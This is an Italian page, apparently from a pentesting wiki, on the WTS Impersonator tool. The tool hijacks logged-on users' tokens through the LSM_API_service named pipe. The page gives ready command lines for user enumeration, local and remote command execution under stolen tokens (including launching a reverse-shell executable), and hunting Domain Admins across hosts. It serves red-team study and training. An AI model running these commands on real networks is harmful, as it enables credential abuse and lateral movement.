{{#include ../../banners/hacktricks-training.md}}

Lo strumento **WTS Impersonator** sfrutta il **"\\pipe\LSM_API_service"** RPC Named pipe per enumerare furtivamente gli utenti connessi e dirottare i loro token, eludendo le tecniche tradizionali di impersonificazione dei token. Questo approccio facilita movimenti laterali senza soluzione di continuità all'interno delle reti. L'innovazione dietro questa tecnica è attribuita a **Omri Baso, il cui lavoro è accessibile su [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Funzionalità Principali

Lo strumento opera attraverso una sequenza di chiamate API:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Moduli Chiave e Utilizzo

- **Enumerazione Utenti**: L'enumerazione degli utenti locali e remoti è possibile con lo strumento, utilizzando comandi per ciascun scenario:

- Localmente:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotamente, specificando un indirizzo IP o un nome host:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Esecuzione di Comandi**: I moduli `exec` e `exec-remote` richiedono un contesto di **Servizio** per funzionare. L'esecuzione locale richiede semplicemente l'eseguibile WTSImpersonator e un comando:

- Esempio per l'esecuzione di comandi locali:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe può essere utilizzato per ottenere un contesto di servizio:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Esecuzione Remota di Comandi**: Comporta la creazione e l'installazione di un servizio in remoto simile a PsExec.exe, consentendo l'esecuzione con le autorizzazioni appropriate.

- Esempio di esecuzione remota:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Modulo di Caccia agli Utenti**: Mira a utenti specifici su più macchine, eseguendo codice sotto le loro credenziali. Questo è particolarmente utile per mirare agli Amministratori di Dominio con diritti di amministratore locale su diversi sistemi.
- Esempio di utilizzo:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
